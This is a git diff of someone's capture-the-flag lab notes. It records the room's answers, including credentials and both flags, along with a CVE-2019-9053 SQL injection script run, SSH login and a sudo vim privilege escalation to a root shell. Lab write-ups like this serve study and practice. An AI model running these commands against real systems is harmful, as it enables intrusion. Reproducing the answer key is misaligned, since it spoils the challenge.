@@ -1,4 +1,4 @@
-export IP=10.10.36.12
+export IP=10.10.87.213
 
 
 ==================================================
@@ -27,34 +27,40 @@ export IP=10.10.36.12
 
 5) What's the password?
 
-	Answer: ``
+	Answer: `secret`
+	Notes: See approach step #5.
 
 6) Where can you login with the details obtained?
 	
-	Answer: ``
+	Answer: `SSH`
 
 7) What's the user flag?
 
-	Answer: ``
+	Answer: `G00d j0b, keep up!`
+	Notes: Located at /home/mitch/user.txt.
 
 8) Is there any other user in the home directory? What's its name?
 
-	Answer: ``
+	Answer: `sunbath`
 
 9) What can you leverage to spawn a privileged shell?
 
-	Answer: ``
+	Answer: `vim`
+	Notes: See approach steps #7 & #8.
 
 10) What's the root flag?
 
-	Answer: ``
+	Answer: `W3ll d0n3. You made it!`
 
 
 ==================================================
 
 [IMPORTANT INFORMATION]
 
-Potential username: mike
+CMS Username: mitch
+CMS Password: secret
+
+Script to spawn root access: `sudo vim -c ':!/bin/sh'`
 
 
 ==================================================
@@ -67,7 +73,7 @@ Potential username: mike
 
 2) Running gobuster:
 
-	Command: `gobuster dir -u http://10.10.36.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,py,js,html,css -o gobuster.txt`
+	Command: `gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,py,js,html,css,sh -o gobuster.txt`
 
 3) Running nikto:
 
@@ -79,7 +85,24 @@ Potential username: mike
 
 5) Tried using the CVE script, cve-2019-9053.py:
 
-	Command: `python cve-2019-9053.py -u http://$IP/simple -w /usr/share/wordlists/best110.txt`
+	Command: `python cve-2019-9053.py -u http://$IP/simple -w /usr/share/wordlists/best110.txt --crack`
 	Notes:
-		Saved output to cve-2019-9053-output.txt.
-		Didn't seem to work the first time. Gonna try adding the -c flag (crack flag).
+		- Saved output to cve-2019-9053-output.txt, but didn't seem to work the first time. Gonna try adding the -c flag (crack flag).
+		- Didn't seem to work either. Ended up finding another cve-2019-9053.py script (https://gist.github.com/pdelteil/6ebac2290a6fb33eea1af194485a22b1), and gave it a try. It worked. See `cve-2019-9053-output.txt`.
+
+6) Following along with the questions, we can use the username and password to SSH into the box, but remember the SSH port is 2222.
+	
+	Command: `ssh mitch@$IP -p 2222`
+
+7) Ran `sudo -l` to see what I could do as mitch and got this output:
+
+	Output: User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+    Notes:
+    	- Makes me think I can break out into a root level shell using vim.
+
+8) On GTFOBins, searching 'vim', I may have found a way to root into the box:
+
+	Command: `sudo vim -c ':!/bin/sh'`
+	Notes:
+		- YUP!
